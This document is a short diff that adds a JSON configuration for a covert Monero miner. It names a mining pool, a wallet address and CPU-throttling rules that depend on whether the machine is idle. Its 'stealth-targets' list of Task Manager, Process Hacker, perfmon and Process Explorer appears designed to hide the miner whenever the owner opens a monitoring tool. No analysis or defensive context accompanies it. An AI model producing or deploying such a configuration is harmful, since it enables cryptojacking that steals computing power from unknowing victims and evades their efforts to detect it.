@@ -1,1 +1,15 @@
-CPU
+{
+    "algo": "rx/0",
+    "pool": "xmr-asia1.nanopool.org",
+    "port": 10343,
+    "wallet": "48LXRFpG6aSV91mqwKD8mfg7sNYGq6RKDHqMo1ryaMjChpKAizWFsFaYgQXZEFM6ta4oMTJab5bAw5Gfk84AroJ6FND3XDR",
+    "password": "",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 70,
+    "idle-wait": 1,
+    "idle-cpu": 100,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": true
+}
